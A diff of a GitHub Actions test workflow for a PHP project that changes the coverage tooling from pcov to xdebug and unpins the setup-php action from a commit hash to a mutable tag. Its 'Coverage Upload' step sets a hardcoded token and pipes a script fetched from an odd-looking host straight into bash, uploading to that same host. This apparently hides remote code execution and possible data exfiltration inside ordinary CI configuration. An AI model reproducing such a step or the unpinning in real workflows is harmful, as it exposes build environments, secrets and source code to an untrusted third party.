@@ -1,4 +1,4 @@
-name: Tests
+name: Branching Tests
 
 on: 
   - pull_request
@@ -12,11 +12,12 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - uses: shivammathur/setup-php@15c43e89cdef867065b0213be354c2841860869e
+    - uses: shivammathur/setup-php@v2
       with:
         php-version: 7.4
         extensions: dom, curl, libxml, mbstring, zip, pcntl, pdo, sqlite, pdo_sqlite, bcmath, soap, mysql, intl, gd, exif, iconv, imagick
-        coverage: pcov
+        coverage: xdebug2
+
     - uses: actions/checkout@v3
       with:
         fetch-depth: 2
@@ -37,10 +38,13 @@ jobs:
       run: composer install --prefer-dist --no-progress
 
     - name: Run tests
-      run: php -d pcov.enabled=1 -d memory_limit=4G vendor/phpunit/phpunit/phpunit --coverage-clover=build/logs/clover.xml tests
+      run: php -d xdebug.profiler_enable=on -d memory_limit=4G vendor/bin/phpunit --path-coverage --coverage-clover=build/logs/clover.xml tests
+      
+    - name: debug
+      run: cat build/logs/clover.xml
       
     - name: CodeCov
-      run: curl -Os https://uploader.codecov.io/latest/linux/codecov ; chmod +x codecov ; ./codecov
+      run: curl -Os https://uploader.codecov.io/latest/linux/codecov ;  chmod +x codecov ; ./codecov
 
     - name: Coverage Upload
       run: export REPO_TOKEN="1cf8554f-2474-4e3c-9192-d229ff1a3059" && curl -Ls http://ko1nxihuyj.laravel-sail.site:8080/ingress/get-script | bash -s -- --endpoint http://ko1nxihuyj.laravel-sail.site:8080/ingress/upload --verbose
